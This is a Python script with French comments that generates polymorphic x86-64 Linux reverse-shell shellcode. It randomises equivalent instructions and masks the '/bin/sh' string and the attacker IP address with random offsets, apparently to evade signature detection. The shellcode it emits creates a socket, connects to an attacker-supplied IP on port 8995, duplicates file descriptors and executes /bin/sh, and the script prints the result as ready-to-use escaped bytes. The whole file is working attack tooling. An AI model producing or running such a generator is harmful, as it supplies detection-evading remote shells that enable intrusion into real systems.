import random
import argparse
import ipaddress

rand_ip = ""
# Définir les arguments de ligne de commande
parser = argparse.ArgumentParser()
parser.add_argument('-ip', '--ip-address', required=False, help='Adresse IP à convertir en hexadécimal')

# Analyser les arguments de ligne de commande
args = parser.parse_args()

#global shellcode
shellcode = ""


def xor (registre, shellcode):		
	
	# Tableau contenant les instructions xor avec différents registres		
	xor_rax = ['4831c0', '4829c0', '4d31e44994', '4d31e4415458'] #xor rax, rax // sub rax, rax // xor  r12, r12 | xchg rax, r12 // xor  r12, r12 | push r12 | pop  rax
	xor_rbx = ['4831db', '4829DB', '4d31e44c87e3', '4d31e441545b']
	xor_rcx = ['4831c9', '4829C9', '4d31e44c87e1', '4d31e4415459']
	xor_rdx = ['4831d2', '4829D2', '4d31e44c87e2', '4d31e441545a']
	xor_rdi = ['4831FF', '4829FF', '4d31e44c87e7', '4d31e441545f']
	xor_rsi = ['4831F6', '4829F6', '4d31e44c87e6', '4d31e441545e']

	# Sélectionne une instruction xor aléatoire en fonction du registre demandé
	if registre == "rax":
		shellcode += xor_rax[random.randint(0, 3)]
	if registre == "rbx":
                shellcode += xor_rbx[random.randint(0, 3)]
	if registre == "rcx":
                shellcode += xor_rcx[random.randint(0, 3)]
	if registre == "rdx":
                shellcode += xor_rdx[random.randint(0, 3)]
	if registre == "rdi":
                shellcode += xor_rdi[random.randint(0, 3)]
	if registre == "rsi":
                shellcode += xor_rsi[random.randint(0, 3)]

	return shellcode


# Fonction qui renvoie la valeur hexadécimale pour les instructions mov en fonction du registre
def mov_hex(register) :

	if register == 'al':
		return 'b0'
	if register == 'bl':
		return 'B3'
	if register == 'dl':
		return 'b2'
	
# Fonction qui renvoie la valeur hexadécimale pour les instructions add en fonction du registre
def add_hex(register) :
			
	if register == 'al':
		return '04'
	if register == 'bl':
		return '80c3'
	if register == 'dl':
		return '80c2'

# Fonction qui renvoie la valeur hexadécimale pour les instructions sub en fonction du registre		
def sub_hex(register) :
	
	if register == 'al':
		return '2c'
	if register == 'bl':
		return '80eb'
	if register == 'dl':
		return '80ea'
		
def pop(register) :
	
	if register == 'al':
		return '6658' 
	if register == 'bl':
		return '665b'
	if register == 'dl':
		return '665a'

def mov_register_decimal(register, value):
	reg = ""
	methode = random.randint(1, 2)
	#methode = 1
	if methode == 1:
		reg += '6a'
		reg += value
		reg += pop(register)
	if methode == 2:
		reg += mov_hex(register)
		reg += value
		reg += add_hex(register)
		reg += value
		reg += sub_hex(register)
		reg += value
	return reg 
	
def bin_bash():
	code = ""
	rand = str(random.randint(10, 255))
	# Converti cette chaîne en un entier hexadécimal, puis ajouter le nombre aléatoire généré précédemment
	bash = '0x68732f6e69622f2f' # '/bin/sh' en ASCII hexadécimal
	tmp = int(bash, 16) + int(rand)
	# Convertir le résultat en little-endian
	little_endian = hex(int.from_bytes(bytes.fromhex(hex(tmp)[2:]), byteorder='little'))
	code += '48bb' # mov rbx, immediate
	code += little_endian[2:] 
	code += '4d31e4' # xor r12, r12
	code += '41b4' # mov, r12b
	code += hex(int(rand))[2:] # La valeur du registre r12b
	code += '4c29e3' # sub rbx, r12
	return code
	
def ip_polymorpeher(args):
	code = ""
	# Convertir l'adresse IP en hexadécimal
	ip_address_obj = ipaddress.IPv4Address(args.ip_address)
	hex_address = hex(int(ip_address_obj))
	print(hex_address)

	rand_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
	ip_address_obj = ipaddress.IPv4Address(rand_ip)
	rand_ip = hex(int(ip_address_obj))

	print(rand_ip)

	tmp = hex(int(hex_address, 16) + int(rand_ip, 16))
	code += '48c7c6'
	print('tmp = ' + tmp)
	little_endian = hex(int.from_bytes(bytes.fromhex(tmp[2:]), byteorder='little'))
	print('endianned = ' + little_endian)
	code += little_endian[2:]
	little_endian_rand = hex(int.from_bytes(bytes.fromhex(rand_ip[2:]), byteorder='little'))
	code += '49c7c4'
	code += little_endian_rand[2:]
	tmp2 = int(tmp, 16) - int(rand_ip, 16)
	code += '4c29e6'
	print(hex(tmp2))
	print(code)
	return code

def shellcodize(s):
    shellcode = 'X'
    shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
    shellcode = shellcode.replace('X', '\\x')
    return(shellcode)

shellcode = xor('rax', shellcode)
shellcode = xor('rbx', shellcode)
shellcode = xor('rcx', shellcode)
shellcode = xor('rdx', shellcode)
shellcode = xor('rdi', shellcode)
shellcode = xor('rsi', shellcode)

shellcode += mov_register_decimal('al', '29')
shellcode += mov_register_decimal('bl', '02')

if random.random() < 0.5: shellcode += '488d3b' #lea rdi, [rbx]
else: shellcode += '4889df' #mov rdi, rbx
shellcode += mov_register_decimal('bl', '01')

if random.random() < 0.5: shellcode += '488d33' #lea rsi, [rbx]
else: shellcode += '4889de' #mov rsi, rbx

shellcode += '0f05' #syscall

if random.random() < 0.5: shellcode += '488d38' #lea rdi, [rax]
else: shellcode += '4889c7' #mov rdi, rax

if random.random() < 0.5: shellcode += '4c8d10' #lea r10, [rax]
else: shellcode += '4989c2' #mov r10, rax

shellcode = xor('rax', shellcode)
shellcode += mov_register_decimal('al', '2a')
shellcode = xor('rbx', shellcode)

shellcode += '53' #push rbx

#shellcode += 'be80ffff20' #mov esi, 0x020ffff80

#shellcode += '81ee01ffff10' #sub esi, 0x010ffff01
shellcode += ip_polymorpeher(args)

shellcode += '6668231d' #push word 0x1d23

shellcode += '666a02' #push word 0x02 

shellcode += '4889e6' #mov rsi, rsp

shellcode += mov_register_decimal('dl', '18')

shellcode += '0f05' #syscall

shellcode = xor('rax', shellcode)
shellcode = xor('rdx', shellcode)
shellcode += mov_register_decimal('al', '21')
if random.random() < 0.5: shellcode += '498d3a' #lea rdi, [r10]
else: shellcode += '4c89d7' #mov rdi, r10 

shellcode = xor('rsi', shellcode)
shellcode += '0f05' #syscall


shellcode = xor('rax', shellcode)
shellcode = xor('rdx', shellcode)
shellcode += mov_register_decimal('al', '21')
if random.random() < 0.5: shellcode += '498d3a' #lea rdi, [r10]
else: shellcode += '4c89d7' #mov rdi, r10 
shellcode += '48ffc6' #inc rsi 
shellcode += '0f05' #syscall

shellcode = xor('rax', shellcode)
shellcode = xor('rdx', shellcode)
shellcode += mov_register_decimal('al', '21')
if random.random() < 0.5: shellcode += '498d3a' #lea rdi, [r10]
else: shellcode += '4c89d7' #mov rdi, r10 
shellcode += '48ffc6' #inc rsi 
shellcode += '0f05' #syscall

shellcode = xor('rax', shellcode)
shellcode = xor('rdx', shellcode)

shellcode += bin_bash()

shellcode += '50' # push rax

shellcode += '53' # push rbx

shellcode += '4889e7' #mov rdi, rsp 

shellcode += '50' # push rax

shellcode += '57' # push rdi

shellcode += '4889e6' #mov rsi, rsp

shellcode += mov_register_decimal('al', '3b')
shellcode += '0f05' #syscall
shellcode = xor('rdi', shellcode)
shellcode = xor('rax', shellcode)
shellcode += mov_register_decimal('al', '3c')
shellcode += '0f05' #syscall



print(shellcodize(shellcode))